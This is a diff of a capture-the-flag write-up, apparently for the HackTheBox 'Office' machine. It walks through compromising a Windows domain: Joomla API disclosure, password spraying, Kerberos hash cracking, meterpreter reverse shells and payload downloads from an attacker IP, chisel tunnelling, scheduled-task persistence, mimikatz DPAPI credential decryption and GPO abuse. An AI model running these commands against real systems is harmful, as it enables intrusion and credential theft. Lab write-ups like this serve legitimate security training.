@@ -36,6 +36,7 @@ nmap 10.129.22.81 -A -sC
 - Add office.htb to /etc/hosts
 
 - Subdomain enumeration:
+
 ```bash
 gobuster dns -d office.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r office.htb:53
 
@@ -44,6 +45,7 @@ gobuster dns -d office.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1m
 ![image4](../resources/0b01ddc2afd946869c439fae0df0d503.png)
 
 - Extension search on office.htb:
+
 ```bash
 dirsearch -u http://office.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -t 50
 
@@ -64,6 +66,7 @@ dirsearch -u http://office.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-C
 ![image7](../resources/825614c70d4e4118bef9a2ae3819c103.png)
 
 - Dirsearch the **https**:
+
 ```bash
 dirsearch -u https://office.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50
 
@@ -76,7 +79,7 @@ dirsearch -u https://office.htb -w /usr/share/wordlists/dirbuster/directory-list
 
 ![image9](../resources/c8b5ef6387984dd2814b1bc2c3a24371.png)
 
-<https://office.htb/joomla/>
+https://office.htb/joomla/
 
 
 ![image10](../resources/c49d80faa914407590ffb1d129ca123b.png)
@@ -111,6 +114,7 @@ So we know administrator is a valid user
 ![image15](../resources/a62b41fa33874977b66742ade1a8b3a9.png)
 
 - To test for vulnerability:
+
 ```bash
 curl -v http://office.htb/api/index.php/v1/config/application?public=true
 
@@ -145,6 +149,7 @@ curl -v http://office.htb/api/index.php/v1/users?public=true
 "name":"Tony Stark","username":"Administrator","email":"**Administrator@holography.htb**"
 
 - Vind valid users:
+
 ```bash
 ./kerbrute userenum --dc 10.129.23.162 -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o validusers.txt
 
@@ -152,6 +157,7 @@ cat validusers.txt | grep "VALID" | cut -d ":" -f 4 | cut -d " " -f 2 > users.tx
 
 ```
 - See if any of them are vulnerable to ASRepRoasting:
+
 ```bash
 impacket-GetNPUsers office.htb/ -users validusers.txt -no-pass -dc-ip 10.129.23.162
 
@@ -166,6 +172,7 @@ But none are
 ![image21](../resources/87f609fd2f2443f9917c9fbf046e2c78.png)
 
 - Check all the users against the password found for the Joomla SQL DB:
+
 ```bash
 crackmapexec smb 10.129.23.162 -u users.txt -p "H0lOgrams4reTakIng0Ver754\!"
 
@@ -176,7 +183,7 @@ crackmapexec smb 10.129.23.162 -u users.txt -p "H0lOgrams4reTakIng0Ver754\!"
 We find a valid user.
 
 ```bash
-smbmap -H office.htb -u \<user_found\> -p "H0lOgrams4reTakIng0Ver754\!"
+smbmap -H office.htb -u <user_found> -p "H0lOgrams4reTakIng0Ver754\!"
 
 ```
 
@@ -204,6 +211,7 @@ enum4linux -u "<user_found>" -p "H0lOgrams4reTakIng0Ver754\!" -a office.htb
 ![image27](../resources/6793f7263c88477596b4ea90b5550231.png)
 
 - Connect to share:
+
 ```bash
 smbclient -U <user_found>%H0lOgrams4reTakIng0Ver754! \\\\office.htb\\"SOC Analysis"
 
@@ -264,6 +272,7 @@ Using the details from the TCP stream and the hashcat wiki:
 **\$krb5pa\$18\$tstark\$OFFICE.HTB\$**a16f4806da…….a3765386f5fc
 
 - Crack with hashcat:
+
 ```bash
 hashcat -m 19900 -a 0 hash /usr/share/wordlists/rockyou.txt
 
@@ -329,11 +338,13 @@ whoami /all
 ![image47](../resources/9371f2466aa7438699ad9d4fa26208da.png)
 
 - More stable meterpreter shell:
+
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.66 LPORT=4445 -f exe -o shell.exe
 
 ```
 - Upload meterpreter shell to target :
+
 ```bash
 (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.66:8082/shell.exe', 'C:\xampp\htdocs\joomla\templates\cassiopeia\shell.exe')
 
@@ -343,12 +354,14 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.66 LPORT=4445 -f 
 - Download RunasCs:
 <https://github.com/antonioCoco/RunasCs/releases/tag/v1.5>
 
-- Upload RunasCs.exe to victim (from meterpreter session) :
+- Upload RunasCs.exe to victim (from meterpreter session):
+
 ```bash
 upload RunasCs.exe
 
 ```
-- Create another meterpreter reverse shell on a different port and upload it
+- Create another meterpreter reverse shell on a different port and upload it:
+
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.66 LPORT=4447 -f exe -o shell2.exe
 
@@ -358,6 +371,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.66 LPORT=4447 -f 
 - Set up meterpreter multi/handler listener
 
 - Run:
+
 ```bash
 RunasCs.exe tstark <password>".\shell2.exe"
 
@@ -386,6 +400,7 @@ query user
 ![image52](../resources/035cd71ad81948949d7e79e28c58b169.png)
 
 - Get the version:
+
 ```powershell
 $libreofficeInstallPath = "C:\Program Files\LibreOffice 5"
 $libreofficeVersion = (Get-Item "$libreofficeInstallPath\program\soffice.bin").VersionInfo.FileVersion
@@ -425,16 +440,19 @@ A webserver running on port 8083
 - Upload chisel to the victim
 
 - On Kali:
+
 ```bash
 chisel server -p 8888 --reverse
 
 ```
 - On target:
+
 ```bash
 .\chisel.exe client 10.10.14.66:8888 R:socks
 
 ```
 - Use proxychains on Kali:
+
 ```bash
 proxychains nmap office.htb -Pn -sT -vvv
 
@@ -473,15 +491,18 @@ whoami /priv
 He has SeMachineAccountPrivilege set.
 
 - Persistence in case we lose the session:
+
 ```bash
 msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.66; set lport 4449; exploit"
 ```
+
 ```bash
 schtasks /create /sc minute /mo 1 /tn "a_innocent" /tr "C:\users\Public\shellppotts.exe" /ru "ppotts"
 ```
 **<u>Crack DPAPI stored credentials:</u>**
 
 - From cmd:
+
 ```bash
 vaultcmd /listcreds:"Windows Credentials" /all
 
@@ -490,6 +511,7 @@ vaultcmd /listcreds:"Windows Credentials" /all
 ![image63](../resources/966ddefbdd424725a55ca149cb005829.png)
 
 - From mimikatz
+
 ```bash
 vault::list
 
@@ -516,6 +538,7 @@ Get-Childitem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials
 ![image67](../resources/791c35a315ee4262938b2bbd8a3bc87b.png)
 
 - In Mimikatz:
+
 ```bash
 dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
 
@@ -538,7 +561,8 @@ Like this:
 
 Here we can see the Masterkey that matches up - **191d3f9d-7959-4b4d-a520-a444853c47eb**
 
-- The cache is empty atm
+- The cache is empty atm:
+
 ```bash
 dpapi::cache
 
@@ -547,6 +571,7 @@ dpapi::cache
 ![image72](../resources/89bdeace409f4e1cb205644f7fa0c358.png)
 
 - Now decrypt the masterkey:
+
 ```bash
 dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
 
@@ -556,6 +581,7 @@ dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-
 ![image73](../resources/fd4fe3b292444486a79237966718caa2.png)
 
 - Now we can decrypt the encrypted credentials:
+
 ```bash
 dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
 
@@ -570,6 +596,7 @@ UserName : OFFICE\\**HHogan**
 CredentialBlob : **\<password\>**
 
 - Login with WinRM:
+
 ```bash
 evil-winrm -i 10.129.24.92 -u hhogan -p "<password>"
 
@@ -587,6 +614,7 @@ whoami /all
 Hhogan is part of the **GPO Managers**
 
 - Upload Sharphound and run:
+
 ```bash
 .\SharpHound.exe --CollectionMethods All --Domain office.htb --ZipFileName loot.zip
 
@@ -601,6 +629,7 @@ GPO Managers has GenericWrite to the Default Domain Controller Policy.
 <https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master>
 
 - Copy SharpGPOAbuse.exe to the Windows target machine and run:
+
 ```bash
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hhogan --GPOName "DEFAULT DOMAIN CONTROLLERS POLICY"
 
@@ -618,6 +647,7 @@ gpupdate /force
 
 ```
 - Check localgroup:
+
 ```bash
 net localgroup administrators
 
